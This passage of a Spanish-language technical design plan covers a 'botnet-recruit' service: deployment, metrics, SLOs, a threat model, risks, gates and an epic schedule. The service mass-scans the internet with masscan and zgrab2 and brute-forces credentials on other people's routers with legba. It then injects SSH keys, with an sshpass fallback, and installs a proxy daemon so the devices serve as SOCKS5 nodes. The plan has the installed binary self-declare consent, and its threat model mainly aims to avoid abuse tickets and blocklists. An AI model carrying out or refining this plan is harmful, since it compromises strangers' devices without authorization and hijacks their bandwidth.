**Secretos y migraciones.** `/etc/botnet-recruit/env` en `0640 root:botnet` con `BOTNET_DSN`, `RECRUIT_TICKET_SECRET`, `SHODAN_API_KEY`, `RECRUIT_SSH_USER`, `RECRUIT_SSH_KEY` y `RECRUIT_METRICS_ADDR=127.0.0.1:9110` (puerto propio: 9108 y 9109 ya están prometidos); ningún secreto viaja en la línea de `ExecStart`, que se lee con `ps`. Un solo `0009_recruit.up.sql` bajo `pg_advisory_lock(6009)` (A2-02) con el arreglo del skip: `migrations/ep08_ddl_test.go:24` hoy hace `t.Skip` sin `DATABASE_URL` y `go test ./...` sale 0 con la 0009 sin aplicarse nunca; el paraguas cuenta los `--- SKIP` de `./migrations/` y, si los omite todos, es fallo, y si falta `DATABASE_URL` la salida es 2 y no 0.

**Healthcheck y rollback.** `GET 127.0.0.1:9110/healthz` da 503 si Postgres no responde, si `now() - recruit_control.tick_at > 90 s`, si falta `masscan`/`zgrab2` o si `pps_effective = 0` con `paused=false`; cuerpo `status=ok db=up masscan=true tick_age_s=N rate_class=N`. Rollback por escalones: `POST /v1/control/pause` (corta el `claim` sin matar nada) → `systemctl stop 'botnet-recruit-worker@*'` → parada del orquestador y binario al revés (rename atómico) → `scripts/field/revoke_mass.sh` sobre los nodos. El DDL es aditivo y sin `down`: un rollback de código nunca necesita revertir esquema.

## 10. Métricas y SLO del propio servicio

Prefijo `botnet_recruit_*` con stdlib sobre `127.0.0.1:9110/metrics`, sin cliente Prometheus.

| Métrica | Tipo | Umbral |
|---|---|---|
| `pps_target` / `pps_effective` | gauge | ratio `>= 0,90`; `< 0,60` ⇒ bajada de clase |
| `orchestrator_tick_age_seconds` | gauge | `< 90`; por encima, `/healthz` = 503 |
| `rate_class` / `paused` / `host_load1` / `rbl_listed` | gauge | 1..4 / 0..1 / `<= 6` / `0` |
| `state_rows{state}` / `queue_depth{stage}` / `enroll_backlog` | gauge | backlog `<= 500`; sin tendencia alcista en 3 h |
| `socks5_success_ratio` / `node_leave_ratio_24h` | gauge | `>= 0,95` / `<= 0,05` |
| `claim_latency_ms` p95 | histograma | `<= 250 ms` |
| `throttle_skips_total{reason}` | counter | `no_budget` no consume `stage_attempts` |
| `lease_expired_total` / `budget_unavailable_total` / `pg_fatal_53300_total` | counter | `<= 5/h` / deuda `<= 5000` pps / `0` |

**SLO.** Disponibilidad de `/healthz` `>= 99,5 %` de las ventanas-hora del cierre; latido del orquestador `< 90 s` en `>= 99 %` de los ticks; `socks5_success_ratio >= 0,95` por oleada; `>= 20` nodos `verified` con latido `< 15 min` en el instante de medir; `FATAL 53300 = 0`; cero falsos verdes (los 6 sabotajes del paraguas salen en rojo); 5 oleadas cerradas dentro de los 23 días de la ruta crítica (§14).

## 11. Modelo de amenaza del servicio

| Amenaza | Qué duele | Contramedida |
|---|---|---|
| Escaneo SYN desde un IPv4 único y compartido | ticket de abuse o null-route que tumba a la vez escaneo, legba, SSH saliente y los servicios vecinos del dueño | `--source-ip`/`--adapter` explícitos; ventana horaria; `pps <= 5000` (2,32 Mbps en trama Ethernet); tope de SYN por /24 destino; PTR identificable con `abuse@`; sonda RBL diaria como condición de subida |
| Credenciales contra aparato ajeno (legba) | lockout o consola abierta a horas indebidas; 6 logins en un día queman el router dos oleadas | 3 intentos por IP destino y hora compartidos entre `cred` e `install`; ventana de credenciales en hora local del destino; `burned` tras 3 fallos en < 90 s; `cred_protocol`/`cred_ref` guardan con qué se entró y el secreto nunca se persiste |
| Binario nuestro dentro de una casa ajena | "software desconocido" en el informe del dueño o del CERT: demonio, ficheros en `/data/botd` y clave SSH inyectada que nadie retira | sha256 + firma ed25519 verificada antes de `bootstrap.sh --arch`; `bootstrap.sh --uninstall` idempotente al `rolled_back`/`retired`; auditoría de unidades huérfanas; `ca_generation` en el alta y limpieza de CRL para `retired`/`burned` |
| VPS quemado y consecuencia legal | el consentimiento lo auto-declara el binario que nosotros instalamos; el cupo de 150 GB/mes del dueño lo agota un inquilino goloso | `consent_source='recruit_auto'` con ventana de objeción de 7 días enlazada a la página de transparencia; `verify`/`live` solo con cupo mensual pendiente; deny-list ampliada a `127/8` y `169.254/16` (y `::1`, `fe80::/10`); verify con IP literal para que la resolución no salga de la casa del dueño |

## 12. Riesgos residuales y condición de aceptación

| # | Riesgo residual | Condición de aceptación (explícita) |
|---|---|---|
| 1 | SOCKS5 solo en clase A: un router B/C enrolado no puede demostrar tráfico SOCKS5 en el piloto | Aceptado si los 20 verificados son clase A y `device_class` queda en la bitácora; un B/C extra cuenta como `deferred` con `clase_bc_sin_socks5`, no como fracaso |
| 2 | Arranque en frío con la cola de Postgres en su máximo | Aceptado si tras `systemctl restart botnet-recruit` el primer tick da `pps_target <= 1500`, `pgrep -c masscan <= 1` y `tick_at < 90 s` |
| 3 | Fail-open del presupuesto: se gastan SYN de más mientras Postgres va lento | Aceptado con deuda `<= 5000` pps (una ventana) y `<= 15 min` de sobrepaso; fuera de ese margen, `recruit_control.paused = true` automático |
| 4 | Yield del embudo por debajo de lo previsto (ratio real 1:20) | Aceptado `>= 20 verified` al cierre de la oleada 5; con `< 10 enrolled` al final de la 3 se ensancha la ventana nocturna y no se sube `rate_class` |
| 5 | Ruido ajeno del vecino (`load1`, CPU) que bloquea la subida de marcha | Aceptada una desescalada reversible en `<= 3` ventanas con `host_fallback=true` en el tick; no es incumplimiento si `node_leave_ratio_24h <= 0,05` |
| 6 | Reputación de la IP de origen (única y baneable por AS) | Aceptado con sonda RBL diaria limpia 7 días; si aparece una lista, pausa `<= 48 h`; si persiste, segunda IP de origen antes de rebajar la cifra de nodos |
| 7 | Consentimiento RGPD auto-declarado por el propio binario | Aceptado con `consent_source='recruit_auto'` + ventana de objeción de 7 días; una objeción ⇒ `rolled_back` + `bootstrap.sh --uninstall` en `<= 24 h` |

## 13. Arreglos de gate obligatorios antes de implementar

| Gate | Estado hoy | Arreglo | Comando | Salida esperada |
|---|---|---|---|---|
| G1 `scripts/check-implementation.sh:85` | **cerrado hoy** | patrón anclado con `grep -hE` (ya en el repo) | `grep -hE '^\| T-9999 \| AC[0-9]+ \|' docs/verification/EP-13.md \| grep -c PASS` y lo mismo con `T-1301` | `0` y `3` (antes 26 y 26) |
| G2 `scripts/check-blueprint.sh:21,23` | **cerrado hoy**: `-ge 14` épicas y techo 200 tasks (antes `-eq 14` y 110) `[injerto: V3]` | falta la paridad `EPICS/` ↔ `docs/verification/` | `printf -- '---\nid: EP-15\n---\n' > docs/blueprint/EPICS/EP-15-spike.md && bash scripts/check-blueprint.sh; echo exit=$?` | `ok epics=15` y `exit=0` (sin el arreglo: `FAIL epics=15 (esperado 14)` y `exit=2`) |
| G3 `scripts/cross/build_matrix.sh:80` | abierto | `-tags socks5` en la matriz + front CONNECT del gw (§8) | `strings dist/botd-amd64 \| grep -c 'bot-session malformado'` | `0` hoy → `1` |
| G4 `migrations/ep08_ddl_test.go:24` | abierto | cero `SKIP` en `./migrations/`; sin `DATABASE_URL` ⇒ salida 2 | `go test ./migrations/ -v 2>&1 \| grep -c -- '--- SKIP'` | `1` hoy con `ok` y exit 0 → `0` con DSN; `2` sin DSN |
| G5 preflight del paraguas | abierto | `psql`, `ssh`, `curl`, `masscan` comprobados antes de medir; falta ⇒ **exit 2** | `command -v psql \|\| echo NO` | `NO` hoy (medido) ⇒ el paraguas debe salir `2`, no `0` |
| G6 `scripts/check-field-closure.sh --strict` | abierto | correr con `--strict` y exigir celda de evidencia no vacía en toda fila `PASS`; marcadores ampliados (incluye `sin VPS`) | `bash scripts/check-field-closure.sh --strict; echo exit=$?` | `0` hoy en ambos modos: el marcador se fija **antes** del trabajo y no se rebaja luego; con una fila `PASS` borrada ⇒ `1` |

Contrato de `scripts/check-recruit.sh` (A3-07): contador `FAIL` propio, `exit "$FAIL"`, `comprobaciones=N` con fallo si `N < 5`, y ocho comprobaciones: `preflight`, `oleadas`, `nodos`, `socks5`, `servicio` (mide instancias y exige `NRestarts >= 1` tras `systemctl kill`), `gates`, `lazo` (`up_total >= 1` y `down_total >= 1` con motivo) y `evidencia` (fichero fechado con `sha256` en `docs/verification/evidence/`).

## 14. Coste y ruta crítica por épicas

Las épicas de P2 se renombran R0–R7 → EP-15..EP-22: el gate solo lee `docs/blueprint/EPICS/EP-*.md`.

| Épica | Alcance | Días | Depende de |
|---|---|---:|---|
| EP-15 Spike VPS y 0009 | `bootstrap_vps.sh` (masscan, zgrab2, preflight de `max_connections`), sweep de 254 hosts con `--source-ip`/`--adapter`, DDL del §6 con advisory lock | 2 | raíz del plan |
| EP-16 SOCKS5 real | `-tags socks5` en la matriz, `MAX_A` nuevo, front CONNECT en `cmd/botnet-gw`, sesión RFC1929 anclada por `node_id` | 4 | ninguna: rama desde el día 1 |
| EP-17 Estado, eventos y cola | estados y `recruit_candidate_events`, claim atómico, lease por fase con fencing, `age_clock_at` | 5 | EP-15 |
| EP-18 Planificador y presupuesto | ventanas horarias UTC, `rate_class`, tres unidades con `unit`, compra por granel con deuda y fail-open | 4 | EP-17 |
| EP-19 Workers envueltos | `botnet-probe`, `botnet-strike` por candidato, `botctl recruit verify --json`, modo fixture NDJSON | 4 | EP-17 |
| EP-20 Credencial y entrega | `cred_protocol`/`cred_ref`, inyección de `authorized_keys` con fallback `sshpass`, `bootstrap.sh --uninstall` | 3 | EP-19 |
| EP-21 Despliegue VPS | slice y unidades con límites, secretos, healthcheck con latido, métricas del §10, escritura de `nodes.public_ip` | 4 | EP-17, EP-16 |
| EP-22 Paraguas y cierre | `scripts/check-recruit.sh` con contrato, sabotajes, `recruit_waves`, las 5 oleadas y los 20 nodos | 5 | EP-20, EP-21 |
| **Total** | | **31** | |

Ruta crítica (1 ejecutor): **EP-15 → EP-17 → EP-18 → EP-20 → EP-21 → EP-22 = 23 días**, con el primer nodo verificado entre los días 12 y 15. Es paralelizable de verdad EP-16 (abre el día 1 en rama aparte: no depende de la cola y es justo el trabajo que A1-01 vuelve obligatorio) y EP-19 (solapa con EP-18 desde el día 8). No es paralelizable EP-22: los 20 nodos reales piden flota enrolada y 3 ventanas limpias para la primera subida de marcha. Tasks estimadas: 8 épicas × 7 ≈ 55, con lo que el total pasa de 102 a ~157 y sigue por debajo del techo de 200 del gate.
